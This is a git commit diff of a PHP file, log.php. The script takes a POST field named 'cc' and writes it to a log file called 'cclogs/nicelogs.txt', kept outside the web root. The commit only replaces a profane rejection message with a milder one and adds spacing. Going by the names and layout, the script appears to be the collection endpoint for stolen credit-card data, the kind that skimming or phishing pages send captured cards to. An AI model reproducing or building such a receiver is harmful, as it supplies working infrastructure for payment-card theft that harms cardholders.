e74d7552b63df19e12fbd40c3571936ac03bf0da
₱ØⱠɎ₥ØⱤ₱Ⱨł₵ <54730301+lilmond@users.noreply.github.com>
2024-07-03 21:37:43 +0800

    Update log.php

--- log.php
+++ log.php
@@ -2,15 +2,19 @@
 
 if (!isset($_POST["cc"])){
     http_response_code(403);
-    die("fuck off dickhead😂");
+    die("grr! u dont belong here.");
 }
 
 require_once("./system.php");
+
 $rootPath = $_SERVER["DOCUMENT_ROOT"];
+
 if (!is_dir("${rootPath}/../cclogs/"))
 {
     mkdir("${rootPath}/../cclogs/");
 }
+
 $logger = new Logger("${rootPath}/../cclogs/nicelogs.txt");
 $logger->logText($_POST["cc"]);
+
 die("OK");
